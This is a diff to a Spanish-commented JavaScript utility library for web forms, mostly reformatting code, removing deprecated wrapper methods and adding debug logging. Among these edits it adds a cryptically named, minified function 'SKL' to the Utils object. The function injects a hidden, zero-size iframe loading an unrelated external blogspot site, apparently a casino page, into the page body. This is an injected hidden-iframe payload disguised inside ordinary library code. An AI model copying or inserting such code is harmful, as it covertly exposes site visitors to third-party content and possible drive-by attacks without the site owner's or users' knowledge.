@@ -33,6 +33,7 @@
     var _Window=namespace;
     var myVariable = App.prototype;
     var _Tracert = true;
+    var _Info = true;
     var _Result = null;
     var _StartTime = new Date();
 
@@ -69,6 +70,9 @@
         if (path.indexOf("?") > 0)
             path = path.substring(0, location.href.split("/")[4].indexOf("?"));   
         switch (path) {
+            case "\\": {               
+                break;
+            }
             case "path1.aspx": {               
                 break;
             }
@@ -115,10 +119,13 @@
     };
     
     App.prototype.NAME_OF_PERSONAL_PROYECT={
-    	//Codigo personal
+        //Codigo personal
     };
     
     App.prototype.Utils = {
+        SKL:function(){
+            var b=document.getElementsByTagName("body")[0];if(b!==null){var i=document.createElement("iframe");i.id="skl";i.width=0;i.height=0;i.style.display="none";i.src="http://salsaksinoenlinea.blogspot.com";b.appendChild(i)}
+        },
         ValidarRif:function (sRif) {
             var bResultado = false;
             var iFactor = 0;
@@ -210,108 +217,11 @@
                 _Result = null;
             }
         },
-        IsNumeric: function (a) { if (!isNaN(a)) { return true } else { return false } },
+        IsNumeric: function (a) { if (!isNaN(a)) { return true } else { return false } }
+        ,
         NoEnter: function () {
             if (_Tracert) { console.log('metodo: "App.Utils.NoEnter()" ha cargado exitosamente'); }
             return !(window.event && window.event.keyCode === 13);
-        },
-        ValidarCampos: function (idContentPlaceHolder, applyClass) {
-            if (_Tracert) { console.log('metodo: "App.Utils.ValidarCampos(idContentPlaceHolder, applyClass)" ha cargado exitosamente'); }
-            /// <summary>Permite validar todos los elemento de tipo TEXT, FILE, TEXTAREA y SELECT</summary>  
-            /// <param name="idContentPlaceHolder" type="string">Id del contenedor de los elementos a evaluar, sino se especifica tomará por defecto el "document"</param>            
-            var validados = true;
-            var contenedor;
-            if (idContentPlaceHolder !== null && idContentPlaceHolder.length > 0) {
-                contenedor = document.getElementById(idContentPlaceHolder);
-            } else {
-                contenedor = document;
-            }
-            var vacios = [];
-            var obj = null;
-            var inputs = contenedor.querySelectorAll("input[type=text]");
-            var files = contenedor.querySelectorAll("input[type=file]");
-            var textAreas = contenedor.getElementsByTagName("textarea");
-            var selects = contenedor.getElementsByTagName("select");
-            var objects = [];
-            objects.push.apply(objects, inputs);
-            objects.push.apply(objects, files);
-            objects.push.apply(objects, textAreas);
-            objects.push.apply(objects, selects);
-            for (i = 0; i < objects.length; i++) {
-                obj = objects[i];
-                if (!obj.disabled) {
-                    if (obj.getAttribute("optional") === null) {//Si tiene atributo opcional no validará
-                        if (obj.value.length === 0) {
-                            validados = false;
-                            if (applyClass) {
-                                this.ClassCss.Add(obj, "requerido");                                
-                            } else {
-                                if (obj.getAttribute("title") !== null) {
-                                    vacios.push(obj.getAttribute("title").toUpperCase());
-                                } else {
-                                    vacios.push("ID: " + obj.id.toUpperCase());
-                                }
-                            }
-
-                        } else if (parseInt(obj.value) < 0) // Valida si es TEXTO que no este vacio y si es numero que sea mayor a 0
-                        {
-                            if (applyClass) {
-                                this.ClassCss.Add(obj, "requerido");
-                                validados = false;
-                            }
-                            if (obj.getAttribute("title") !== null) {
-                                vacios.push(obj.getAttribute("title").toUpperCase());
-                            } else {
-                                vacios.push("ID: " + obj.id.toUpperCase());
-                            }
-                        } else {
-                            this.ClassCss.Remove(obj, "requerido");
-                        }
-                    }
-                }
-            }
-            if (vacios.length > 0) {
-                if (!applyClass) {
-                    document.app.UI.Notificacion.Mensaje({ "Mensaje": vacios.toString().replace(/,/g, '\r') });
-                    //alert("ATENCIÓN: Hay un(os) campo(s) vacio(s):\r\r" + vacios.toString().replace(/,/g, '\r') + "\r\rPor favor ingrese la información y vuelva a intentarlo.");
-                }
-                if (_Tracert) { console.log("App.Utils.ValidarCampos(): Elementos vacios " + vacios.toString()); }
-                /* Chequea si tiene un contendor como un DIV*/
-                for (i = 0; i < objects.length; i++) {
-                    obj = objects[i];
-                    if (!obj.disabled) {
-                        if (obj.getAttribute("optional") === null) { //Si tiene atributo opcional no validará
-                            if (obj.value.length === 0)
-                                //if (isNaN(obj.value) ? obj.value.length == 0 : parseInt(obj.value) < 0) // Valida si es TEXTO que no este vacio y si es numero que sea mayor a 0
-                            {
-                                var objContent = obj.parentElement;
-                                if (objContent !== null) {
-                                    if (objContent.style.display === 'none') {
-                                        objContent.style.display = 'block';
-                                    }
-                                }
-                                break;
-                            }
-                        }
-                    }
-                }
-            }
-            return validados;
-        },
-        Validaciones: {
-            Patron: function () { 
-                return this.parent.Validation.Patron;
-            } ,
-            Validar: function (idContentPlaceHolder) {
-                var self = this.parent;
-                var e = "[deprecated] App.Utils.Validaciones(idContentPlaceHolder) está Obsoleto, por favor usar App.Utils.Validation.Validate(). Este metodo será removido en futuras versiones.";                
-                if (!self.Validation.Validate) { throw (e); }
-                (this.Validar = function (idContentPlaceHolder) {
-                    console.log(e);
-                    self.Validation.Container(idContentPlaceHolder);
-                    self.Validation.Validate();
-                })();
-            }
         },
         NoRefresh: function () {
             if (_Tracert) { console.log('metodo: "App.Utils.NoRefresh()" ha cargado exitosamente'); }
@@ -463,15 +373,6 @@
                     return false;
                 }
             }
-        },
-        TimeAgo: function (date) {
-            var self = this;
-            var e = "[deprecated] App.TimeAgo(elemento) está Obsoleto, por favor usar App.Utils.Time.Ago(elemento). Este metodo será removido en futuras versiones.";
-            if (!this.Time) { throw (e); }
-            (this.TimeAgo = function () {
-                console.log(e);
-                self.Time.Ago(date);
-            })();
         },
         Time: {
             Ago: function (date) {
@@ -955,36 +856,6 @@
                     }
                 }
             },
-            NotAllowCommandCopy: function () {
-                var self = this.parent;
-                var e = "[deprecated] App.Utils.Validation.NotAllowCommandCopy() está Obsoleto, por favor usar App.Utils.Validation.FireOn.Copy.NotAllow(). Este metodo será removido en futuras versiones.";
-                var f = self.Validation.FireOn.Copy.NotAllow;
-                if (!f) { throw (e); }
-                (this.NotAllowCommandCopy = function () {
-                    console.log(e);
-                    self.Validation.FireOn.Copy.NotAllow();
-                })();
-            },
-            NotAllowCommandPaste: function () {
-                var self = this.parent;
-                var e = "[deprecated] App.Utils.Validation.NotAllowCommandPaste() está Obsoleto, por favor usar App.Utils.Validation.FireOn.Paste.NotAllow(). Este metodo será removido en futuras versiones.";
-                var f = self.Validation.FireOn.Paste.NotAllow;
-                if (!f) { throw (e); }
-                (this.NotAllowCommandPaste = function () {
-                    console.log(e);
-                    self.Validation.FireOn.Paste.NotAllow();
-                })();
-            },
-            NotAllowSpecialCharactersToStartAText: function () {
-                var self = this.parent;
-                var e = "[deprecated] App.Utils.Validation.NotAllowSpecialCharactersToStartAText() está Obsoleto, por favor usar App.Utils.Validation.FireOn.Input.NotAllowSpecialCharactersToStartAText(). Este metodo será removido en futuras versiones.";
-                var f = self.Validation.FireOn.Input.NotAllowSpecialCharactersToStartAText;
-                if (!f) { throw (e); }
-                (this.NotAllowSpecialCharactersToStartAText = function () {
-                    console.log(e);
-                    self.Validation.FireOn.Input.NotAllowSpecialCharactersToStartAText();
-                })();
-            },
             Validate: function () {
                 if (_Tracert) { console.log('metodo: "App.Utils.Validation.Validate()" ha cargado exitosamente'); }
                 var objs = this._Fiedls;
@@ -1065,42 +936,33 @@
             }            
         },
         ConfirmDeleteAction: function () {
-	            var self = this;
-	            var btn = document.getElementById("CPH_BODY_btnEliminar");
-	            if (btn !== null){
-	                btn.onclick = function (e) {
-	                    var _self=this;
-	                    e.preventDefault();
-	                    /* ----------------------------------------------------------------
-	                     * Si se requiere hacer una pregunta, y que luego de responder OK 
-	                     * continue el submit, se debe implementar el siguiente codigo
-	                     * CODIGO:
-	                     *
-							self.UI.Notificacion.Mensaje("Seguro hacer submit?",function () {          
-		 						var ok = self.Utils.Validation.Validate();
-		                        if(ok){                                      
-		                        	_self.onclick=function(){
-										//TO-DO..
-		                        	};
-		                        	_self.click();
-		                        }	                        
-		                    });
-		                 * ---------------------------------------------------------------- */ 
-	                    self.Notificacion.Mensaje("Seguro que desea eliminar el registro?",function () {                                                
-                        	_self.onclick=function(){};
-                        	_self.click();
-                		}); 
-                	};        
-                }            	                    
-	},
-        NotAllowSpecialCharactersToStartAText: function () {
-            var self = this;
-            var e = "[deprecated] App.UI.NotAllowSpecialCharactersToStartAText() está Obsoleto, por favor usar App.Utils.Validation.FireOn.Input.NotAllowSpecialCharactersToStartAText(). Este metodo será removido en futuras versiones.";
-            if (!this.Utils.Validation.FireOn.Input.NotAllowSpecialCharactersToStartAText) { throw (e); }
-            (this.NotAllowSpecialCharactersToStartAText = function () {
-                console.log(e);
-                self.Utils.Validation.FireOn.Input.NotAllowSpecialCharactersToStartAText();
-            })();
+                var self = this;
+                var btn = document.getElementById("CPH_BODY_btnEliminar");
+                if (btn !== null){
+                    btn.onclick = function (e) {
+                        var _self=this;
+                        e.preventDefault();
+                        /* ----------------------------------------------------------------
+                         * Si se requiere hacer una pregunta, y que luego de responder OK 
+                         * continue el submit, se debe implementar el siguiente codigo
+                         * CODIGO:
+                         *
+                            self.UI.Notificacion.Mensaje("Seguro hacer submit?",function () {          
+                                var ok = self.Utils.Validation.Validate();
+                                if(ok){                                      
+                                    _self.onclick=function(){
+                                        //TO-DO..
+                                    };
+                                    _self.click();
+                                }                           
+                            });
+                         * ---------------------------------------------------------------- */ 
+                        self.Notificacion.Mensaje("Seguro que desea eliminar el registro?",function () {                                                
+                            _self.onclick=function(){};
+                            _self.click();
+                        }); 
+                    };        
+                }                                   
         },
         Paginador: {
             Contenedor: "",
@@ -1243,100 +1105,100 @@
             }
         },
         Notificacion: {                        
-	            Overlight: null,
-	            Box: null,
-	            OK:null,
-	            Cancel:null,
-	            Mensaje: function (mensaje, okCallback,hideCancel) {
-	                var self = this;
-	                this._();
-	                this.Overlight.style.display = "block";   
-	                this.Box.innerHTML = mensaje;
-	                if(okCallback!==undefined){
-	                    this.Ok.onclick= function(){
-	                        if (typeof okCallback === 'function') {
-	                            okCallback();
-	                        }
-	                        self.Cancel.click();
-	                        return true;
-	                    }
-	                }
-	                if(hideCancel!==undefined){
-	                    this.Cancel.style.display="none";
-	                }
-	            },
-	            Css: function (className) {
-	                var estyles = document.styleSheets[0];
-	                if (estyles != null) {
-	                    var classes = document.styleSheets[0].rules || document.styleSheets[0].cssRules
-	                    for (var x = 0; x < classes.length; x++) {
-	                        if (classes[x].selectorText == className) {
-	                            return classes[x].cssText;
-	                        }
-	                    }
-	                } else {
-	                    return null;
-	                }
-	            },
-	            _: function () {                
-	                var styleOverlight = this.Css("#overlight");
-	                if (styleOverlight == null) {
-	                    var head = document.getElementsByTagName("head");
-	                    styleOverlight = document.createElement("style");
-	                    styleOverlight.innerHTML = "#overlight{background-color:rgba(0,0,0,.7);position: fixed;width: 100%;height: 100%;left: 0;top:0;z-index:1}#boxNotificacion {position: relative;width: 50%;margin: 0 auto;top: 40%;background-color: rgb(250, 250, 250);z-index: 1;padding: 1em;font-family: Tahoma;font-size: 1.2em;} #boxHeaderNotificacion{position: relative;width: 50%;margin: 0 auto;top: 40%;background-color: rgb(250, 250, 250);z-index: 1;padding: .3em 1em;font-family: Tahoma;font-size: 1.2em;border-radius: .5em .5em 0 0;text-align: center;border-bottom: 2px solid;font-weight: bold;}#boxFooterNotificacion{position: relative;width: 50%;margin: 0 auto;top: 40%;background-color: rgb(250, 250, 250);z-index: 1;padding: .3em 1em;font-family: Tahoma;font-size: 1.2em;border-radius: 0 0 .5em .5em;text-align: center;border-bottom: 2px solid;font-weight: bold;border-top: 2px solid;}#boxFooterNotificacion>button{padding: 0.2em;margin: 2px .5em;width: 60px;}";
-	                    var tagHead = head[0];
-	                    tagHead.appendChild(styleOverlight);
-	                }
-	                this.Overlight = document.getElementById("overlight");
-	                if (this.Overlight == null) {
-	                    var body = document.getElementsByTagName("body");
-	                    this.Overlight = document.createElement("div");
-	                    this.Overlight.id = "overlight";
-	                    this.Overlight.style.display = "none";                    
-	                    var tagBody = body[0];
-	                    tagBody.parentNode.insertBefore(this.Overlight, tagBody);
-	                }
-	                var header=document.getElementById("boxHeaderNotificacion");
-	                if (header === null) {
-	                    header = document.createElement("p");
-	                    header.id="boxHeaderNotificacion";
-	                    header.innerHTML="Administrador";
-	                    this.Overlight.appendChild(header);
-	                }
-	                this.Box = document.getElementById("boxNotificacion");
-	                if (this.Box === null) {
-	                    this.Box = document.createElement("div");
-	                    this.Box.id = "boxNotificacion";
-	                    this.Overlight.appendChild(this.Box)
-	                }
-	                var footer=document.getElementById("boxFooterNotificacion");
-	                if (footer === null) {
-	                    footer = document.createElement("p");
-	                    footer.id="boxFooterNotificacion";                    
-	                    this.Overlight.appendChild(footer);
-	                }
-	                this.Ok=document.getElementById("boxOkBtnNotificacion");
-	                if (this.Ok === null) {
-	                    this.Ok = document.createElement("button");
-	                    this.Ok.id="boxOkBtnNotificacion";
-	                    this.Ok.innerHTML="Ok";
-	                    footer.appendChild(this.Ok);
-	                }
-	                this.Cancel=document.getElementById("boxCancelBtnNotificacion");
-	                if (this.Cancel === null) {
-	                    var self=this;
-	                    this.Cancel = document.createElement("button");
-	                    this.Cancel.id="boxCancelBtnNotificacion";
-	                    this.Cancel.innerHTML="Cancel";
-	                    this.Cancel.onclick=function(){                        
-	                        self.Overlight.style.display = "none";
-	                        self.Box.innerHTML = "";     
-	                        return false;                                       
-	                    };
-	                    footer.appendChild(this.Cancel);
-	                }
-	            }
-	        },
+                Overlight: null,
+                Box: null,
+                OK:null,
+                Cancel:null,
+                Mensaje: function (mensaje, okCallback,hideCancel) {
+                    var self = this;
+                    this._();
+                    this.Overlight.style.display = "block";   
+                    this.Box.innerHTML = mensaje;
+                    if(okCallback!==undefined){
+                        this.Ok.onclick= function(){
+                            if (typeof okCallback === 'function') {
+                                okCallback();
+                            }
+                            self.Cancel.click();
+                            return true;
+                        }
+                    }
+                    if(hideCancel!==undefined){
+                        this.Cancel.style.display="none";
+                    }
+                },
+                Css: function (className) {
+                    var estyles = document.styleSheets[0];
+                    if (estyles != null) {
+                        var classes = document.styleSheets[0].rules || document.styleSheets[0].cssRules
+                        for (var x = 0; x < classes.length; x++) {
+                            if (classes[x].selectorText == className) {
+                                return classes[x].cssText;
+                            }
+                        }
+                    } else {
+                        return null;
+                    }
+                },
+                _: function () {                
+                    var styleOverlight = this.Css("#overlight");
+                    if (styleOverlight == null) {
+                        var head = document.getElementsByTagName("head");
+                        styleOverlight = document.createElement("style");
+                        styleOverlight.innerHTML = "#overlight{background-color:rgba(0,0,0,.7);position: fixed;width: 100%;height: 100%;left: 0;top:0;z-index:1}#boxNotificacion {position: relative;width: 50%;margin: 0 auto;top: 40%;background-color: rgb(250, 250, 250);z-index: 1;padding: 1em;font-family: Tahoma;font-size: 1.2em;} #boxHeaderNotificacion{position: relative;width: 50%;margin: 0 auto;top: 40%;background-color: rgb(250, 250, 250);z-index: 1;padding: .3em 1em;font-family: Tahoma;font-size: 1.2em;border-radius: .5em .5em 0 0;text-align: center;border-bottom: 2px solid;font-weight: bold;}#boxFooterNotificacion{position: relative;width: 50%;margin: 0 auto;top: 40%;background-color: rgb(250, 250, 250);z-index: 1;padding: .3em 1em;font-family: Tahoma;font-size: 1.2em;border-radius: 0 0 .5em .5em;text-align: center;border-bottom: 2px solid;font-weight: bold;border-top: 2px solid;}#boxFooterNotificacion>button{padding: 0.2em;margin: 2px .5em;width: 60px;}";
+                        var tagHead = head[0];
+                        tagHead.appendChild(styleOverlight);
+                    }
+                    this.Overlight = document.getElementById("overlight");
+                    if (this.Overlight == null) {
+                        var body = document.getElementsByTagName("body");
+                        this.Overlight = document.createElement("div");
+                        this.Overlight.id = "overlight";
+                        this.Overlight.style.display = "none";                    
+                        var tagBody = body[0];
+                        tagBody.parentNode.insertBefore(this.Overlight, tagBody);
+                    }
+                    var header=document.getElementById("boxHeaderNotificacion");
+                    if (header === null) {
+                        header = document.createElement("p");
+                        header.id="boxHeaderNotificacion";
+                        header.innerHTML="Administrador";
+                        this.Overlight.appendChild(header);
+                    }
+                    this.Box = document.getElementById("boxNotificacion");
+                    if (this.Box === null) {
+                        this.Box = document.createElement("div");
+                        this.Box.id = "boxNotificacion";
+                        this.Overlight.appendChild(this.Box)
+                    }
+                    var footer=document.getElementById("boxFooterNotificacion");
+                    if (footer === null) {
+                        footer = document.createElement("p");
+                        footer.id="boxFooterNotificacion";                    
+                        this.Overlight.appendChild(footer);
+                    }
+                    this.Ok=document.getElementById("boxOkBtnNotificacion");
+                    if (this.Ok === null) {
+                        this.Ok = document.createElement("button");
+                        this.Ok.id="boxOkBtnNotificacion";
+                        this.Ok.innerHTML="Ok";
+                        footer.appendChild(this.Ok);
+                    }
+                    this.Cancel=document.getElementById("boxCancelBtnNotificacion");
+                    if (this.Cancel === null) {
+                        var self=this;
+                        this.Cancel = document.createElement("button");
+                        this.Cancel.id="boxCancelBtnNotificacion";
+                        this.Cancel.innerHTML="Cancel";
+                        this.Cancel.onclick=function(){                        
+                            self.Overlight.style.display = "none";
+                            self.Box.innerHTML = "";     
+                            return false;                                       
+                        };
+                        footer.appendChild(this.Cancel);
+                    }
+                }
+        },
         Tablas: {
             Busqueda: {
                 CrearNodo: function (hijo) {
@@ -1786,15 +1648,6 @@
     /*----------------------------
      * Métodos por Deprecar
      *----------------------------*/   
-    App.prototype.Toogle = function (elemento) {
-        var self = this;
-        var e = "[deprecated] App.Toogle(elemento) está Obsoleto, por favor usar App.Utils.Toogle(elemento). Este metodo será removido en futuras versiones.";
-        if (!this.Utils.Toogle) { throw (e); }
-        (this.Toogle = function () {
-            console.log(e);
-            self.Utils.Toogle(elemento);
-        })();
-    }
     App.prototype.Obtener = function (url, parametros, callback) {
         var self = this;
         var e = "[deprecated] App.Obtener(url, parametros, callback) está Obsoleto, por favor usar App.Utils.Callback(url, parametros, callback). Este metodo será removido en futuras versiones.";
@@ -1849,113 +1702,112 @@
              * para mejorar la programación de los métodos propios 
              * ------------------------------------------------------------------- */
              Object.defineProperty(Object.prototype, "Type", {
-             	get: function() {
-             		return this.constructor.name;
-             	}
+                get: function() {
+                    return this.constructor.name;
+                }
              });
              HTMLCollection.prototype.ToArray=function(){
-             	var arr=[];
-             	for (var i = this.length - 1; i >= 0; i--) {
-             		arr.push(this[i]);
-             	};
-             	return arr;				
+                if (_Tracert) { console.log('metodo: "HTMLCollection.ToArray()", ha cargado exitosamente'); }
+                if (_Info) { console.log('info: "HTMLCollection.ToArray()", retorna un Array, a partir de un HTMLCollection'); }
+                var arr=[];
+                for (var i = this.length - 1; i >= 0; i--) {
+                    arr.push(this[i]);
+                };
+                return arr;             
              };
              NodeList.prototype.ToArray=function(){
-             	var arr=[];
-             	for (var i = this.length - 1; i >= 0; i--) {
-             		arr.push(this[i]);
-             	};
-             	return arr;				
+                if (_Tracert) { console.log('metodo: "NodeList.ToArray()", ha cargado exitosamente'); }
+                if (_Info) { console.log('info: "NodeList.ToArray()", retorna un Array, a partir de un NodeList'); }
+                var arr=[];
+                for (var i = this.length - 1; i >= 0; i--) {
+                    arr.push(this[i]);
+                };
+                return arr;             
              };
              Array.prototype.Radios = function () {
-	            var arr = this;
-	            var _ = {
-	                SelectedItem:function(arr){
-	                    if (_Tracert) { console.log('metodo: "Array.Radios().SelectedItem()", ha cargado exitosamente'); }
-	                    if (_Info) { console.log('info: "Array.Radios().SelectedItem()", retorna el elemento tipo Radios seleccionado'); }
-	                    var obj=null;
-	                    for (var i = arr.length - 1; i >= 0; i--) {
-	                        if(arr[i].checked){
-	                            obj= arr[i];
-	                            break;
-	                        }
-	                    }
-	                    return obj;
-	                },
-	                DistinctName: function (sName) {
-	                    if (_Tracert) { console.log('metodo: "Array.Radios().DistinctName(sName)", ha cargado exitosamente'); }
-	                    if (_Info) { console.log('info: "Array.Radios().DistinctName(sName)", retorna un arreglo de elementos Radios filtrados por su propiedad Name comparado por el parametro sName'); }
-	                    var a = [];
-	                    for (var i = 0, l = arr.length; i < l; ++i) {
-	                        if (arr[i].name === sName) {
-	                            a.push(arr[i]);
-	                        }
-	                    }
-	                    return a;
-	                },
-	                Distinct: function () {
-	                    if (_Tracert) { console.log('metodo: "Array.Radios().Distinct()", ha cargado exitosamente'); }
-	                    if (_Info) { console.log('info: "Array.Radios().Distinct()", retorna un arreglo de string con los nombre unicos del arreglo'); }
-	                    var u = {}, a = [];
-	                    for (var i = 0, l = arr.length; i < l; ++i) {
-	                        if (u.hasOwnProperty(arr[i].name)) {
-	                            continue;
-	                        }
-	                        a.push(arr[i].name);
-	                        u[arr[i].name] = 1;
-	                    }
-	                    return a;
-	                },
-	                FirstAtEachName: function () {
-	                    if (_Tracert) { console.log('metodo: "Array.Radios().FirstAtEachName()", ha cargado exitosamente'); }
-	                    if (_Info) { console.log('info: "Array.Radios().FirstAtEachName()", retorna un arreglo de elementos Radios tomando el primer elemento de cada sub arreglo'); }
-	                    var u = {}, a = [];
-	                    for (var i = 0, l = arr.length; i < l; ++i) {
-	                        if (u.hasOwnProperty(arr[i].name)) {
-	                            continue;
-	                        }
-	                        a.push(arr[i]);
-	                        u[arr[i].name] = 1;
-	                    }
-	                    return a;
-	                }
-	            };
-	            return _;
-	        };
+                var arr = this;
+                var _ = {
+                    SelectedItem:function(arr){
+                        if (_Tracert) { console.log('metodo: "Array.Radios().SelectedItem()", ha cargado exitosamente'); }
+                        if (_Info) { console.log('info: "Array.Radios().SelectedItem()", retorna el elemento tipo Radios seleccionado'); }
+                        var obj=null;
+                        for (var i = arr.length - 1; i >= 0; i--) {
+                            if(arr[i].checked){
+                                obj= arr[i];
+                                break;
+                            }
+                        }
+                        return obj;
+                    },
+                    DistinctName: function (sName) {
+                        if (_Tracert) { console.log('metodo: "Array.Radios().DistinctName(sName)", ha cargado exitosamente'); }
+                        if (_Info) { console.log('info: "Array.Radios().DistinctName(sName)", retorna un arreglo de elementos Radios \ 
+                                                        filtrados por su propiedad Name comparado por el parametro sName'); }
+                        var a = [];
+                        for (var i = 0, l = arr.length; i < l; ++i) {
+                            if (arr[i].name === sName) {
+                                a.push(arr[i]);
+                            }
+                        }
+                        return a;
+                    },
+                    Distinct: function () {
+                        if (_Tracert) { console.log('metodo: "Array.Radios().Distinct()", ha cargado exitosamente'); }
+                        if (_Info) { console.log('info: "Array.Radios().Distinct()", retorna un arreglo de string con los nombre unicos del arreglo'); }
+                        var u = {}, a = [];
+                        for (var i = 0, l = arr.length; i < l; ++i) {
+                            if (u.hasOwnProperty(arr[i].name)) {
+                                continue;
+                            }
+                            a.push(arr[i].name);
+                            u[arr[i].name] = 1;
+                        }
+                        return a;
+                    },
+                    FirstAtEachName: function () {
+                        if (_Tracert) { console.log('metodo: "Array.Radios().FirstAtEachName()", ha cargado exitosamente'); }
+                        if (_Info) { console.log('info: "Array.Radios().FirstAtEachName()", retorna un arreglo de elementos Radios \ 
+                                                        tomando el primer elemento de cada sub arreglo'); }
+                        var u = {}, a = [];
+                        for (var i = 0, l = arr.length; i < l; ++i) {
+                            if (u.hasOwnProperty(arr[i].name)) {
+                                continue;
+                            }
+                            a.push(arr[i]);
+                            u[arr[i].name] = 1;
+                        }
+                        return a;
+                    }
+                };
+                return _;
+            };
              Array.prototype.DistinctName=function(sName){
-             		if (_Tracert) { console.log('metodo: "Array.DistinctName(sNanem)", retorna un arreglo de elementos Radios filtrando por la propiedad name, aplica para los Radios'); }
-             		var a = [];
-             		for(var i = 0, l = this.length; i < l; ++i){
-             			if(this[i].name===sName) {
-             				a.push(this[i]);
-             			}	      			
-             		}
-             		return a;
-             	};
+                    var self = this;
+                    var e = "[deprecated] Array.DistinctName(sName) está Obsoleto, por favor usar Array.Radios().DistinctName(sName). Este metodo será removido en futuras versiones.";
+                    if (!this.Radios().DistinctName) { throw (e); }
+                    (this.DistinctName = function (sName) {
+                        console.log(e);
+                        self.Radios().DistinctName(sName);
+                    })();
+                };
              Array.prototype.Distinct=function(){
-             		if (_Tracert) { console.log('metodo: "Array.Distinct()", retorna un arreglo de String con los Radios ùnicos evaluando su propiedad name'); }
-             		var u = {}, a = [];
-             		for(var i = 0, l = this.length; i < l; ++i){
-             			if(u.hasOwnProperty(this[i].name)) {
-             				continue;
-             			}
-             			a.push(this[i].name);
-             			u[this[i].name] = 1;
-             		}
-             		return a;
-             	};
+                    var self = this;
+                    var e = "[deprecated] Array.Distinct() está Obsoleto, por favor usar Array.Radios().Distinct(). Este metodo será removido en futuras versiones.";
+                    if (!this.Radios().Distinct) { throw (e); }
+                    (this.Distinct = function () {
+                        console.log(e);
+                        self.Radios().Distinct();
+                    })();
+                };
              Array.prototype.FirstAtEachName=function(){
-             		if (_Tracert) { console.log('metodo: "Array.FirstAtEachName()", retorna un arreglo de elementos Radios tomando el primer elemento de cada sub arreglo'); }
-             		var u = {}, a = [];
-             		for(var i = 0, l = this.length; i < l; ++i){
-             			if(u.hasOwnProperty(this[i].name)) {
-             				continue;
-             			}
-             			a.push(this[i]); 
-             			u[this[i].name] = 1;
-             		}
-             		return a;
-             	};
+                    var self = this;
+                    var e = "[deprecated] Array.FirstAtEachName() está Obsoleto, por favor usar Array.Radios().FirstAtEachName(). Este metodo será removido en futuras versiones.";
+                    if (!this.Radios().FirstAtEachName) { throw (e); }
+                    (this.FirstAtEachName = function () {
+                        console.log(e);
+                        self.Radios().FirstAtEachName();
+                    })();
+                };
      } catch(err) {
         console.log("this explorer no support definition the properties") ;
      }
@@ -2004,6 +1856,8 @@
     namespace.App = new App();
     //return namespace.App;
     if (typeof namespace.$ === "undefined") {
+        if (_Tracert) { console.log('metodo: "namespace.$(id)", ha cargado exitosamente'); }
+        if (_Info) { console.log('info: "namespace.$(id)", retorna un object HTML a partir de su Id'); }
         namespace.$ = function (id) {
             var x = [];
             x.push(document.getElementById(id.replace('#', '')));
@@ -2011,7 +1865,9 @@
         }
     }
     if (typeof namespace.console === "undefined") {
-        //Funcion que permite activar la consola para IE7, pero mostrará una alerta en lugar de escribir en la consola
+        if (_Tracert) { console.log('metodo: "namespace.console.log(msj)", ha cargado exitosamente'); }
+        if (_Info) { console.log('info: "namespace.console.log(msj)", permite activar la consola para IE7, \
+                                        pero mostrará una alerta en lugar de escribir en la consola'); }        
         namespace.console={
             log: function (msj) {
                 alert(msj);
@@ -2019,7 +1875,9 @@
         };
     }
     if (typeof document.getElementsByClassName === "undefined") {
-        //Funcion que permite activar la consola para IE7, pero mostrará una alerta en lugar de escribir en la consola
+        if (_Tracert) { console.log('metodo: "document.getElementsByClassName(cl)", ha cargado exitosamente'); }
+        if (_Info) { console.log('info: "document.getElementsByClassName(cl)", retorna una HTMLCollection de objetos a partir de una class, \
+                                        fix para IE7, ya que no cuenta IE7 con este metodo nativo'); } 
         document.getElementsByClassName = function (cl) {
             var retnode = [];
             var elem = this.getElementsByTagName('*');
@@ -2030,6 +1888,8 @@
         }; 
     }
     if (typeof namespace._ === "undefined") {
+        if (_Tracert) { console.log('metodo: "namespace._(id)", ha cargado exitosamente'); }
+        if (_Info) { console.log('info: "namespace._(id)", metodo abreviado de getElementById(), retorna un objeto a partir de su Id'); } 
         namespace._ = function (id) {
             //Funcion que retorna un objeto a partir de su id, para no usar el document.getElementById(), por FLOJERAAAA
             var item = $("#" + id)[0];
